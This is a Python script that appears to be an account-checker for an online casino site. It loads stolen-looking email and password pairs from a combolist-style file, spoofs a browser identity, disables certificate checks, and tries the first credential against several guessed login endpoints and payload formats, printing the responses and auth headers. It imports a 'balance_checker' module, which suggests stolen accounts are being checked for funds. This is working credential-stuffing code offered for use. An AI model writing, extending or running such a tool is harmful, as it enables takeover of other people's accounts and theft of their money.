#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from goatspins_balance_checker import load_accounts

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
})

url = 'https://cdk.goatspins.com:3072/lobby/'
accounts = load_accounts('goatspins.com_548.txt')
email, pwd = accounts[0]['email'], accounts[0]['password']
print('Testing with:', email, ':', pwd[:15])

# Try login endpoint
login_urls = [url + u for u in ['api/account/login', 'api/auth/login', 'account/login', 'lobby/api/login']]
payloads = [
    {'username': email, 'password': pwd},
    {'Email': email, 'Password': pwd},
    {'UserName': email, 'Password': pwd},
]

for u in login_urls:
    for p in payloads:
        try:
            r = session.post(u, json=p, timeout=15, allow_redirects=False, verify=False)
            auth_val = r.headers.get('Authorization', 'none')
            cookie = r.headers.get('Set-Cookie', 'none')[:100]
            print(f'  {u}: status={r.status_code}, len={len(r.text)}, auth={auth_val}')
            if r.text and len(r.text) < 300:
                print(f'    Response: {r.text[:300]}')
        except Exception as e:
            print(f'  {u}: ERROR - {e}')
